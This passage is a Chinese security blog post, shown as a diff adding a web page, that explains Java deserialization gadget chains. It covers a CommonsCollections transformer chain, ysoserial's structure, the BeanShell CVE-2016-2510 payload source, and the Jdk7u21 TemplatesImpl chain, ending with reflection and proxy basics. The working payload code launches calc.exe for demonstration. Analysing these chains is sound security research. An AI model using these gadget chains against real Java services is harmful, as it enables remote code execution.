+  AnnotationType var2 = null;
+
+  try {
+    var2 = AnnotationType.getInstance(this.type);
+  } catch (IllegalArgumentException var9) {
+    throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);
+  }
+
+  Map var3 = var2.memberTypes();
+  Iterator var4 = this.memberValues.entrySet().iterator();
+
+  while(var4.hasNext()) {
+    Entry var5 = (Entry)var4.next();
+    String var6 = (String)var5.getKey();
+    Class var7 = (Class)var3.get(var6);
+    if (var7 != null) {
+      Object var8 = var5.getValue();
+      if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) {
+        var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));
+      }
+    }
+  }
+
+}</code></pre>
+<p>这里其实还是需要分析一下的，我们的目的需要执行<code>var5.setValue</code>，要执行到这里需要一定的条件。只要动态调试一下就可以，主要是<code>var7!=null</code>这个条件，调试一下就可以发现<code>var3</code>只有<code>value</code>这个key，所以，需要<code>Map</code>中的键值为<code>value</code>，即<code>innerMap.put(&quot;value&quot;,&quot;hello world&quot;);</code>。</p>
+<p>OK，调用<code>setValue</code>函数，会依次调用<code>ChainedTransformer</code>里面的每一个<code>Transformer</code>的<code>transform</code>函数。这个<code>ChainedTransformer</code>的构建方法如下。</p>
+<pre><code class="java">((Runtime) Runtime.class.getMethod(&quot;getRuntime&quot;).invoke()).exec(&quot;calc.exe&quot;);
+1.Runtime.class
+new ConstantTransformer(Runtime.class),
+2.getMethod(&quot;getRuntime&quot;)
+new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;,new Class[0]}),
+3.  invoke()
+new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class},new Object[] {null, new Object[0]}),
+4. exec(&quot;calc.exe&quot;)
+new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class},new Object[] {&quot;calc.exe&quot;}),</code></pre>
+<h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><blockquote>
+<p>ysoserial 是一个出名的反序列化漏洞利用工具，内有大量的payload，也很方便用于增加/修改payload。</p>
+</blockquote>
+<h3 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h3><p>源码的src/main/java/ysoserial下是主程序，exploit下是针对不同应用的攻击程序，可以直接修改运行参数来使用不用的payload对目标应用进行测试，payload下是不同组件的反序列化payload，payload目录下有个util目录，里面包含有一些用于生成payload用到的小工具。</p>
+<p>源码的src/test/java/ysooserial下是一些测试服务，可以用来测试payload。</p>
+<p>由于<strong>JEP 290: Filter Incoming Serialization Data</strong> （JDK 9，然后反向移植到8u121, 7u131, and 6u141），在新版本的jdk下很多payload都不能用的，建议测试的时候，用低版本的jdk。</p>
+<h3 id="BeanShell"><a href="#BeanShell" class="headerlink" title="BeanShell"></a>BeanShell</h3><blockquote>
+<p>beanshell （bsh-2.0b5）是一个Java源代码解释器，类似于脚本语言的特性。BeanShell动态执行标准Java语法，并支持常见的脚本编写方法，如松散类型，命令和方法闭包等。BeanShell可以说是利用Java反射机制实现的新型脚本语言。/咦，貌似还挺好用。</p>
+</blockquote>
+<p>BeanShell的反序列化漏洞，<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2510" target="_blank" rel="noopener">CVE-2016-2510</a>，可以看到修复的commit<a href="https://github.com/beanshell/beanshell/commit/1ccc66bb693d4e46a34a904db8eeff07808d2ced#diff-d04c9f4d6d1c01bcd609c11ab2d58b2bR62" target="_blank" rel="noopener"></a>，修复方法为将<code>InvocationHandler invocationHandler=new Handler()</code>，设置为<code>transient</code>，并且禁止<code>Handler</code>类序列化。</p>
+<p><code>BeanShell</code>通过反射的方式来实现调用函数，<code>invocationHandler</code>是我们在动态代理中很熟悉的一个参数，这里考虑到构造某类反序列化时，通过动态代理的方法调用我们事先存储在<code>invocationHandler</code>中的函数，从而执行任意代码。</p>
+<blockquote>
+<p><strong>小技巧</strong><br>java.util.PriorityQueue类经过构造可以调用成员变量的<code>Comparator.compare()</code>和<code>Comparator.compareTo()</code>方法。</p>
+</blockquote>
+<p>Payload如下</p>
+<pre><code class="java">public PriorityQueue getObject(String command) throws Exception {
+// BeanShell payload
+
+    String payload =
+        &quot;compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{&quot; +
+            Strings.join( // does not support spaces in quotes
+                Arrays.asList(command.replaceAll(&quot;\\\\&quot;,&quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;,&quot;\\\&quot;&quot;).split(&quot; &quot;)),
+                &quot;,&quot;, &quot;\&quot;&quot;, &quot;\&quot;&quot;) +
+            &quot;}).start();return new Integer(1);}&quot;;
+
+// Create Interpreter
+Interpreter i = new Interpreter();
+
+// Evaluate payload
+i.eval(payload);
+
+// Create InvocationHandler
+XThis xt = new XThis(i.getNameSpace(), i);
+InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), &quot;invocationHandler&quot;).get(xt);
+
+// Create Comparator Proxy
+Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class&lt;?&gt;[]{Comparator.class}, handler);
+
+// Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
+final PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;Object&gt;(2, comparator);
+Object[] queue = new Object[] {1,1};
+Reflections.setFieldValue(priorityQueue, &quot;queue&quot;, queue);
+Reflections.setFieldValue(priorityQueue, &quot;size&quot;, 2);
+
+return priorityQueue;
+}</code></pre>
+<p>首先，构造beanshell的执行payload，执行并存储在<code>invocationHandler</code>中，</p>
+<pre><code class="java">String payload =
+        &quot;compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{&quot; +
+            Strings.join( // does not support spaces in quotes
+                Arrays.asList(command.replaceAll(&quot;\\\\&quot;,&quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;,&quot;\\\&quot;&quot;).split(&quot; &quot;)),
+                &quot;,&quot;, &quot;\&quot;&quot;, &quot;\&quot;&quot;) +
+            &quot;}).start();return new Integer(1);}&quot;;
+
+// Create Interpreter
+Interpreter i = new Interpreter();</code></pre>
+<p>然后，通过反射，取出<code>XThis</code>的成员变量<code>invocationHandler</code>。</p>
+<pre><code class="java">XThis xt = new XThis(i.getNameSpace(), i);
+InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), &quot;invocationHandler&quot;).get(xt);</code></pre>
+<p>接下来构造动态代理，这里用到了小技巧，</p>
+<p><code>PriorityQueue</code>类，它的readObject方法，跟进<code>heapify()</code>方法，里面调用<code>siftDown</code>方法，跟进，当<code>comparator</code>不为<code>null</code>，会调用<code>siftDownUsingComparator</code>，并在里面调用<code>comparator.compare()</code>方法。</p>
+<pre><code class="java">private void readObject(java.io.ObjectInputStream s)
+    throws java.io.IOException, ClassNotFoundException {
+    // Read in size, and any hidden stuff
+    s.defaultReadObject();
+
+    // Read in (and discard) array length
+    s.readInt();
+
+    queue = new Object[size];
+
+    // Read in all elements.
+    for (int i = 0; i &lt; size; i++)
+        queue[i] = s.readObject();
+
+    // Elements are guaranteed to be in &quot;proper order&quot;, but the
+    // spec has never explained what that might be.
+    heapify();
+}
+
+private void heapify() {
+    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)
+        siftDown(i, (E) queue[i]);
+}
+
+private void siftDown(int k, E x) {
+if (comparator != null)
+    siftDownUsingComparator(k, x);
+else
+    siftDownComparable(k, x);
+}
+
+private void siftDownUsingComparator(int k, E x) {
+    int half = size &gt;&gt;&gt; 1;
+    while (k &lt; half) {
+        int child = (k &lt;&lt; 1) + 1;
+        Object c = queue[child];
+        int right = child + 1;
+        if (right &lt; size &amp;&amp;
+            comparator.compare((E) c, (E) queue[right]) &gt; 0)
+            c = queue[child = right];
+        if (comparator.compare(x, (E) c) &lt;= 0)
+            break;
+        queue[k] = c;
+        k = child;
+    }
+    queue[k] = x;
+}</code></pre>
+<p>所以，我们只要将上面获得的<code>invocationHandler</code>通过动态代理构造出实现<code>Comparator</code>的对象，并作为<code>PriorityQueue</code>的<code>comparator</code>即可。</p>
+<pre><code class="java">// Create Comparator Proxy
+Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class&lt;?&gt;[]{Comparator.class}, handler);
+
+// Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
+final PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;Object&gt;(2, comparator);
+Object[] queue = new Object[] {1,1};
+Reflections.setFieldValue(priorityQueue, &quot;queue&quot;, queue);
+Reflections.setFieldValue(priorityQueue, &quot;size&quot;, 2);
+
+return priorityQueue;</code></pre>
+<p>回顾一下，这里我们学到了一个小技巧<code>PriorityQueue</code>可以在反序列化过程中调用<code>Comparator.compare()</code>和 <code>Comparable.compareTo()</code>函数。</p>
+<h3 id="Jdk7u21"><a href="#Jdk7u21" class="headerlink" title="Jdk7u21"></a>Jdk7u21</h3><blockquote>
+<p>该反序列化漏洞存在jdk自带库中，低于jdk7u21的jdk版本受此漏洞影响。</p>
+</blockquote>
+<pre><code>Gadget chain that works against JRE 1.7u21 and earlier. Payload generation has
+the same JRE version requirements.</code></pre><blockquote>
+<ul>
+<li>Affected Product(s): Java SE 6, Java SE 7</li>
+<li>Fixed in: Java SE 7u25 (2013-06-18), Java SE 8 (2014-03-18)</li>
+</ul>
+</blockquote>
+<pre><code class="java">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
+有成员变量
+byte[][] _bytecodes = null  // 可以存储恶意bytecode
+存在以下调用链
+TemplatesImpl.getOutputProperties()
+  TemplatesImpl.newTransformer()
+    TemplatesImpl.getTransletInstance()
+      TemplatesImpl.defineTransletClasses()
+        ClassLoader.defineClass()
+只要能够调用TemplatesImpl.getOutputProperties() / TemplatesImpl.newTransformer()即可以实现任意代码执行</code></pre>
+<p>在<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的<code>equals</code>方法会反射调用<code>Templates</code>所有方法，所以可以调用<code>getOutputProperties()</code></p>
+<h3 id="Clojure"><a href="#Clojure" class="headerlink" title="Clojure"></a>Clojure</h3><blockquote>
+<p>Clojure是一种高级的，动态的函数式编程语言。 它是基于LISP编程语言设计的，并且具有编译器，可以在Java和.Net运行时环境上运行。</p>
+</blockquote>
+<pre><code>org.clojure:clojure
+Versions since 1.2.0 are vulnerable, although some class names may need to be changed for other versions</code></pre><blockquote>
+<p><strong>小技巧</strong><br>java.util.HashMap类在<code>writeObject</code>过程中，将<code>key/value</code>以列表的形式逐个序列化，在<code>readObject</code>的过程中，会依次调用<code>putVal(hash(key), key, value, false, false);</code>，所以会调用的<code>key.hashCode()</code>和<code>key.equals(k)</code>函数。</p>
+</blockquote>
+<p>由于作者觉得之前写的文章不太容易理解，回炉重造中。。。</p>
+<p>如果读者阅读上面文章感觉吃力，建议动手尝试，下方也提供了少量基础知识。</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Java-反射机制"><a href="#Java-反射机制" class="headerlink" title="Java 反射机制"></a>Java 反射机制</h3><p>Java反射是一个API，它被用于在<strong>运行时</strong><u>检测</u>和<u>修改</u><strong>方法</strong>、<strong>类</strong>、<strong>接口</strong>的行为。</p>
+<p>通过反射，我们可以在运行时调用方法，而无视它们的访问说明符。</p>
+<p>Java的反射的基础是<code>Class</code>类，当JVM加载类时会自动构造<code>Class</code>对象，而<code>Class</code>类对象则封装了（类和接口）的信息。</p>
+<pre><code class="java">import java.lang.reflect.Method;
+
+public class TestReflection {
+    public static void main(String [] args) throws Exception{
+        Object obj = Runtime.getRuntime();
+        // 获取obj的类名
+        System.out.println(obj.getClass().getName());
+        // 通过类名字符串获取类
+        Class c = Class.forName(&quot;java.lang.Runtime&quot;);
+        System.out.println(c);
+
+        // 根据名字获取方法
+        // Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+        Method m1 = c.getDeclaredMethod(&quot;getRuntime&quot;);
+        Object o = m1.invoke(c, null);
+        Method m2 = o.getClass().getMethod(&quot;exec&quot;,String.class);
+        m2.invoke(o, &quot;calc.exe&quot;);
+
+
+    }
+}</code></pre>
+<h3 id="Java动态代理机制"><a href="#Java动态代理机制" class="headerlink" title="Java动态代理机制"></a>Java动态代理机制</h3><p>利用Java反射技术，在运行时创建<strong>接口s</strong>的动态实现。</p>
+<p>一般创建动态代理，用到两个关键的类<code>Proxy</code>和<code>InvocationHandler</code>。</p>
+<blockquote>
+<p>Proxy.newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces,  InvocationHandler h)</p>
+</blockquote>
+<pre><code class="java">import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
+import java.lang.reflect.Proxy;
+
+
+interface IFoo{
+    void go();
+    void fly(int len);
+}
+
+class Foo implements IFoo{
+
+    @Override
+    public void go(){
+        System.out.println(&quot;调用了Foo 的go函数&quot;);
+    }
+
+    public void run(){
+        System.out.println(&quot;调用了Foo 的run函数&quot;);
+    }
+
+    @Override
+    public void fly(int len){
+        System.out.println(&quot;调用了Foo 的fly函数, 飞了&quot;+len+&quot;米&quot;);
+    }
+}
+
+class DynamicInvocationHandler implements InvocationHandler{
+    @Override
+    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
+
+        System.out.println(&quot;调用invoke函数，方法名为&quot;+method.getName()+&quot;, 参数为&quot;+args);
+        return null;
+    }
+}
+
+public class TestDynamicProxy {
+    public static void main(String [] args){
+        // 正常调用
+        Foo f = new Foo();
+        f.go();
+        f.run();
+        f.fly(10);
+
+        // 动态代理调用我们定义的go函数
+        IFoo f1 = (IFoo) Proxy.newProxyInstance(Foo.class.getClassLoader(), new Class[]{IFoo.class}, new DynamicInvocationHandler());
+        f1.go();
+//        ff.run();
+        f1.fly(8);
+
+        IFoo f2 = (IFoo) Proxy.newProxyInstance(Foo.class.getClassLoader(),
+            new Class[]{IFoo.class},
+            new InvocationHandler() {
+                @Override
+                public Object invoke(Object proxy, Method method, Object[] args){
+                    System.out.println(&quot;method name is &quot;+ method.getName() + &quot;, args is &quot;+args);
+                    return null;
+                }
+            });
+        f2.go();
+        f2.fly(7);
+    }
+}
+</code></pre>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至3213359017@qq.com </span>
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry"><span class="miit">
+                <img src="/img/gov.png" title="中华人民共和国工业和信息化部">
+                <a href="http://beian.miit.gov.cn/" target="_blank" rel="noopener">粤ICP备19027389号</a>
+        </span>
+    
+    ©2015-2020 UltramanGaia
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    #post .pjax article .article-entry>ol, #post .pjax article .article-entry>ul, #post .pjax article>ol, #post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    #post .pjax article .article-entry li>ol, #post .pjax article .article-entry li>ul,#post .pjax article li>ol, #post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    #post .pjax article .article-entry>ol>li, #post .pjax article .article-entry>ul>li,#post .pjax article>ol>li, #post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    #post .pjax article .article-entry li>ol>li, #post .pjax article .article-entry li>ul>li,#post .pjax article li>ol>li, #post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
